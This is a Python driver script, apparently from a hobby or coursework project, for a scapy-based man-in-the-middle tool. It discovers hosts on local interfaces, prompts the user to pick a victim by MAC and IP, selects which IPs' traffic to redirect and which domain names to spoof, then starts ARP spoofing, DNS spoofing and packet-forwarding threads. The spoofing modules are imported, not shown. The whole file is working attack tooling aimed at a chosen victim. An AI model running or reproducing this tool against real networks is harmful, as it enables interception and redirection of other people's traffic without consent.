from src import arp_spoof as arp
from src import dns_spoof as dns
from src import discover_active
from src import discover_passive
from src import forward as fwd
from scapy.arch import get_if_list

hosts = dict()
discover_threads = dict()

if __name__ == '__main__':
    available_interfaces = get_if_list()
    print(f"The following interfaces were found: {available_interfaces}")
    print("Please type the names of the interfaces you want to discover hosts on, "
          "type 'done' once all desired interfaces have been input.")
    chosen_interfaces = list()
    while True:
        user_input = input("Name of interface to discover on, or 'done' once finished:\n")
        if user_input in available_interfaces:
            if user_input not in chosen_interfaces:
                chosen_interfaces.append(user_input)
                print(f"Currently selected interfaces: {chosen_interfaces}")
            else:
                print("This interface has already been selected")
        elif user_input == "all":
            chosen_interfaces = available_interfaces
            print(f"Currently selected interfaces: {chosen_interfaces}")
            break
        elif user_input == "done":
            break
        else:
            print("The name you gave does not match any of the available interfaces")

    print("Do you want to actively discover on any of the selected interfaces? "
          "This will generate large amounts of traffic as every possible IP address "
          "in the subnet will be pinged.")
    active_discover_interfaces = list()
    while True:
        user_input = input("[y/n]\n")
        if user_input == "y" or user_input == "n":
            break

    if user_input == "y":
        while True:
            user_input = input("Name of interface to actively discover on, or 'done' once finished:\n")
            if user_input in chosen_interfaces:
                if user_input not in active_discover_interfaces:
                    active_discover_interfaces.append(user_input)
                    print(f"Currently selected interfaces: {active_discover_interfaces}")
                else:
                    print("This interface has already been selected")
            elif user_input == "all":
                active_discover_interfaces = chosen_interfaces
                print(f"Currently selected interfaces: {active_discover_interfaces}")
                break
            elif user_input == "done":
                break
            else:
                print("The name you gave does not match any of the chosen interfaces")

    print(f"Now starting discovery...  press [ENTER] once the desired hosts have been discovered.")
    for interface in chosen_interfaces:
        hosts[interface] = dict()
        discover_threads[interface] = discover_passive.Discover(hosts, interface)
        discover_threads[interface].start()
        if interface in active_discover_interfaces:
            discover_active.discover(interface)
    input()
    for interface in chosen_interfaces:
        discover_threads[interface].stop()

    print("Hosts discovered:")
    for interface in hosts:
        print(f"{interface}")
        for mac in hosts[interface]:
            for ip in hosts[interface][mac]:
                print(f"  {mac}  -  {ip}")

    print("Please type the name of the interface on which the host you want to ARP spoof was found")
    while True:
        user_input = input()
        if user_input in hosts:
            arp_spoof_victim_if = user_input
            break
        else:
            print("This is not an interface on which hosts were discovered, please type another name.")

    print("Please type the MAC address corresponding to the host you want to ARP spoof")
    while True:
        user_input = input()
        if user_input in hosts[arp_spoof_victim_if]:
            arp_spoof_victim_mac = user_input
            break
        else:
            print("This is not a MAC address that was found, please type another MAC address.")

    print("Please type the IP address corresponding to the host you want to ARP spoof")
    while True:
        user_input = input()
        if user_input in hosts[arp_spoof_victim_if][arp_spoof_victim_mac]:
            arp_spoof_victim_ip = user_input
            break
        else:
            print("This is not an IP address that was found, please type another IP address.")

    print("Please type the IP addresses you want to spoof for the victim, "
          "type 'done' once all IP addresses have been input.")  # TODO: IDK if I use the word Spoofed here correctly

    def get_ips_at_interface(iface: str):
        ips = list()
        for mac_address in hosts[iface]:
            ips.extend(hosts[iface][mac_address])
        return ips

    spoofed_ips = list()
    while True:
        user_input = input("IP address that will be spoofed:\n")
        if user_input in get_ips_at_interface(arp_spoof_victim_if):
            if user_input == arp_spoof_victim_ip:
                print("You can't spoof the victim's own IP")
            elif user_input not in spoofed_ips:
                spoofed_ips.append(user_input)
                print(f"IPs whose packets will be redirected to you: {spoofed_ips}")
            else:
                print("This IP has already been selected")
        elif user_input == "all":
            spoofed_ips = get_ips_at_interface(arp_spoof_victim_if)
            spoofed_ips.remove(arp_spoof_victim_ip)
            print(f"IPs whose packets will be redirected to you: {spoofed_ips}")
            break
        elif user_input == "done":
            break
        else:
            print("The name you gave does not match any of the chosen IP addresses")

    print("Please type the domain names you want to spoof for the victim, "
          "type 'done' once all domain names have been input.")
    spoofed_domain_names = list()
    while True:
        user_input = input("Domain name that will be spoofed:\n")
        if user_input in spoofed_domain_names:
            print("This domain name is already in the list of domains that will be spoofed.")
        elif user_input == "done":
            break
        else:
            spoofed_domain_names.append(user_input)
            print(f"domain names that will be spoofed: {spoofed_domain_names}")

    while True:
        print("Please type the IP to which the spoofed domain names should be redirected:")
        user_input = input()
        redirect_ip = user_input
        print(f"Are you sure you want to redirect the spoofed host to {redirect_ip}?")
        user_input = input("[y/n]")

        if user_input == "y":
            break
        else:
            pass

    input("Setup ready, press [ENTER] to start ARP and DNS spoofing.")
    arp_spoofing = arp.ARPSpoofing(
        interface=arp_spoof_victim_if,
        target_mac=arp_spoof_victim_mac,
        target_ip=arp_spoof_victim_ip,
        spoofed_ips=spoofed_ips,
        hosts=hosts,
        delay=3
    )
    dns_spoofing = dns.DNSSpoofing(
        interface=arp_spoof_victim_if,
        domain_names=spoofed_domain_names,
        victims=[arp_spoof_victim_ip],
        redirect_ip=redirect_ip
    )
    forwarding = fwd.Forwarding(
        interface=arp_spoof_victim_if,
        hosts=hosts,
        domain_names=spoofed_domain_names
    )
    arp_spoofing.start()
    dns_spoofing.start()
    forwarding.start()

    input("Press [enter] to stop DNS and ARP spoofing")
    dns_spoofing.stop()
    arp_spoofing.stop()
    forwarding.stop()
